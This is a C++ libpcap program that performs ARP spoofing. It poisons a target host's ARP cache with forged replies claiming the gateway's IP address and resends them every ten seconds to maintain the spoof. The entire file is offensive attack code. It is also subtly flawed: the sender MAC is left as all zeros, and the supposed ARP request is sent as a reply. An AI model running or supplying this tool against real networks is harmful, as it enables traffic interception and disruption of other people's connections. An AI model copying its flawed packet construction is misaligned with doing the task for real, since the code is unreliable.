#include <iostream>
#include <string>
#include <pcap.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <net/if_arp.h>
#include <cstring>

void send_fake_arp_packet(pcap_t *handle, const u_char *target_mac, const u_char *sender_mac,
                          const in_addr_t target_ip, const in_addr_t sender_ip);

int main(int argc, char *argv[]) {
    if (argc != 4) {
        std::cerr << "Usage: " << argv[0] << " <interface> <target_ip> <gateway_ip>" << std::endl;
        return 1;
    }

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle = pcap_open_live(argv[1], BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr) {
        std::cerr << "Cannot open device: " << errbuf << std::endl;
        return 1;
    }

    in_addr_t target_ip = inet_addr(argv[2]);
    in_addr_t gateway_ip = inet_addr(argv[3]);

    u_char target_mac[ETHER_ADDR_LEN] = {0};
    u_char sender_mac[ETHER_ADDR_LEN] = {0};
    u_char broadcast_mac[ETHER_ADDR_LEN] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};

    // Step 1: Send ARP request to get target MAC address
    send_fake_arp_packet(handle, broadcast_mac, sender_mac, target_ip, gateway_ip);

    struct pcap_pkthdr header;
    const u_char *packet;
    while (true) {
        packet = pcap_next(handle, &header);
        if (packet == nullptr) {
            continue;
        }

        struct ether_header *eth_header = (struct ether_header *)packet;
        if (ntohs(eth_header->ether_type) != ETHERTYPE_ARP) {
            continue;
        }

        struct ether_arp *arp_packet = (struct ether_arp *)(packet + sizeof(struct ether_header));
        if (ntohs(arp_packet->arp_op) != ARPOP_REPLY || arp_packet->arp_spa != target_ip) {
            continue;
        }

        memcpy(target_mac, arp_packet->arp_sha, ETHER_ADDR_LEN);
        break;
    }

    // Step 2: Send fake ARP reply to target
    send_fake_arp_packet(handle, target_mac, sender_mac, target_ip, gateway_ip);

    // Step 3: Periodically send fake ARP replies to maintain the spoof
    while (true) {
        sleep(10);
        send_fake_arp_packet(handle, target_mac, sender_mac, target_ip, gateway_ip);
    }

    pcap_close(handle);
    return 0;
}

void send_fake_arp_packet(pcap_t *handle, const u_char *target_mac, const u_char *sender_mac,
                          const in_addr_t target_ip, const in_addr_t sender_ip) {
    u_char packet[sizeof(struct ether_header) + sizeof(struct ether_arp)];
    struct ether_header *eth_header = (struct ether_header *)packet;
    struct ether_arp *arp_packet = (struct ether_arp *)(packet + sizeof(struct ether_header));

    // Step 4: Setup the Ethernet header
    memcpy(eth_header->ether_dhost, target_mac, ETHER_ADDR_LEN);
    memcpy(eth_header->ether_shost, sender_mac, ETHER_ADDR_LEN);
    eth_header->ether_type = htons(ETHERTYPE_ARP);

    // Setup the ARP header
    arp_packet->arp_hrd = htons(ARPHRD_ETHER);
    arp_packet->arp_pro = htons(ETHERTYPE_IP);
    arp_packet->arp_hln = ETHER_ADDR_LEN;
    arp_packet->arp_pln = sizeof(in_addr_t);
    arp_packet->arp_op = htons(ARPOP_REPLY);
    memcpy(arp_packet->arp_sha, sender_mac, ETHER_ADDR_LEN);
    arp_packet->arp_spa = sender_ip;
    memcpy(arp_packet->arp_tha, target_mac, ETHER_ADDR_LEN);
    arp_packet->arp_tpa = target_ip;

    // Send the ARP packet
    if (pcap_sendpacket(handle, packet, sizeof(packet)) == -1) {
        std::cerr << "Error sending ARP packet: " << pcap_geterr(handle) << std::endl;
    }
}

